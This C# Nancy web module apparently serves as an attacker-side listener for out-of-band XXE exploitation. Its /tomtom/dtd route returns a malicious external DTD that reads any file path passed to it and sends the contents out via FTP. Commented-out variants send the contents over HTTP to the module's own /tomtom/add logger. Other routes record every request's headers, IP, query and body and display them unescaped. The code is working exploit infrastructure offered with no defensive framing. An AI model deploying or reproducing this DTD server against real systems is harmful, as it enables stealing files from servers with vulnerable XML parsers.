﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Routing;
using Nancy;

namespace DuosWeb
{
    public class MainModule : NancyModule
    {
        public static List<RequestEntry> Data = new List<RequestEntry>();

        public MainModule()
        {
            Get["/raw"] = _ =>
            {
                return Response.AsText(getRaw());
            };
            Post["/raw"] = _ =>
            {
                return Response.AsText(getRaw());
            };

            Get["/tomtom/add"] = _ =>
            {
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = getRaw()
                });
                return "<!-- added -->";
            };
            Get["/tomtom/list"] = _ =>
            {
                string result = "Now: " + DateTime.Now.ToLongTimeString() + "<br>";
                foreach (var d in Data)
                {
                    result += "<h1>" + d.Date.ToLongTimeString() + "</h1><p>" + d.Info + "<p>";
                }

                return result;
            };
            Get["/tomtom/clear"] = _ =>
            {
                Data.Clear();
                return "cleared";
            };
            Get["/tomtom/test"] = _ =>
            {
                return "test file content";
            };

            Get["/tomtom/dtd"] = _ =>
            {
                string path = Request.Query.path;
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = "RESOURCE ACCESSED WITH PATH = " + path + "<br>" + getRaw()
                });
                //return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'http://duos.apphb.com/tomtom/add?text=%file;'>\">%all;");
                return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'ftp://demo:password@test.rebex.net/text=%file;'>\">%all;");
                //return Response.AsText("<!ENTITY % payload SYSTEM \"" + path + "\"><!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://duos.apphb.com/tomtom/add?text=%payload;'>\"> %int; %trick;");
            };

            Get["/tomtom/{any*}"] = _ =>
            {
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = getRaw()
                });
                return "<!-- added -->";
            };
        }

        string getRaw()
        {
            var dict = ((DynamicDictionary)Request.Query);
            string q = string.Join("&", dict.ToDictionary().Select(x => x.Key + "=" + x.Value));

            string raw = Request.Method + " " + Request.Path + (string.IsNullOrEmpty(q) ? string.Empty : "?" + q) + " " + Request.ProtocolVersion + "<br>";
            raw += Request.UserHostAddress + "<br>";
            raw += "Path: " + Request.Path + "<br>";
            foreach (var r in Request.Headers)
            {
                foreach (var v in r.Value)
                    raw += r.Key + ": " + v + "<br>";
            }
            raw += Environment.NewLine;
            
            raw += "<b>Query:</b><br>" + string.Join("&", new RouteValueDictionary(Request.Query).Select(x => x.Key + "=" + x.Value));
            raw += "<br><b>Body:</b><br>" + new System.IO.StreamReader(Request.Body).ReadToEnd();
            return raw;
        }
    }
}